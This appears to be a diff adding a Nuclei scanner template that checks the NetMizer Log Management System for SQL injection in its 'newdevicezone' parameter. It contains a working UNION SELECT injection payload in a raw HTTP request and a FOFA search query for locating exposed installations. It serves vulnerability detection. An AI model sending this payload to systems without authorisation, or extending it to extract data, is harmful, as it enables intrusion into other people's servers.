@@ -1,0 +1,39 @@
+id: netmizer-log-ms-newdevicezone-sqli
+info:
+  name: NetMizer Log Management System SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    A SQL injection vulnerability exists in the NetMizer Log Management System's `newdevicezone` parameter.
+  metadata:
+    fofa-query: app="NetMizer-日志管理系统"
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - raw:
+      - |
+        GET /data/echart/terminals.php?action=phonelist-grid&newdevicezone=ip:0%20-111+UNION+ALL+SELECT+null,CONCAT(0x7e,(select/**/md5({{t1}})),0x7e),null,null,null,null,null-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"success":true'
+          - "datas"
+          - "{{t2}}"
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
+    extractors:
+      - type: regex
+        regex:
+          - "success.*?true"
